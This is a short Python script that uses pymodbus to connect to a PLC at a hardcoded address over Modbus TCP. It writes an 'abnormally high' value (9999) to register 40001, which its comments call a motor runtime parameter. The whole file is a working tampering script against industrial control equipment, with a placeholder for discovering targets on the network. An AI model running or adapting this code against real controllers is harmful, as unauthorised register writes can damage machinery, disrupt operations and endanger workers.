from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException
import sys

def discover_plc_ip():
    """
    Discover the PLC's IP address on the network.
    This is a placeholder function; replace with actual network scanning logic.
    """
    # Example: Return a hardcoded IP for demonstration purposes.
    # Replace this with actual network discovery logic.
    return "192.168.1.100"

def modify_plc_parameter(plc_ip, register_address, new_value):
    """
    Modify a parameter on the PLC by writing to a specific register.
    :param plc_ip: The IP address of the PLC.
    :param register_address: The Modbus register address to modify.
    :param new_value: The new value to write to the register.
    """
    try:
        # Connect to the PLC
        client = ModbusTcpClient(plc_ip)
        if not client.connect():
            print(f"Failed to connect to PLC at {plc_ip}")
            return

        # Write the new value to the specified register
        print(f"Modifying register {register_address} to value {new_value}...")
        response = client.write_register(register_address, new_value, unit=1)

        if response.isError():
            print(f"Error writing to register {register_address}: {response}")
        else:
            print(f"Successfully modified register {register_address} to {new_value}")

    except ModbusException as e:
        print(f"Modbus communication error: {e}")
    finally:
        # Close the connection
        client.close()

def main():
    # Step 1: Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        print("Could not discover PLC IP address.")
        sys.exit(1)

    print(f"Discovered PLC IP: {plc_ip}")

    # Step 2: Define the register address and new value to modify
    register_address = 40001  # Example: Modbus register address for a motor runtime parameter
    new_value = 9999          # Example: Set an abnormally high runtime value

    # Step 3: Modify the parameter
    modify_plc_parameter(plc_ip, register_address, new_value)

if __name__ == "__main__":
    main()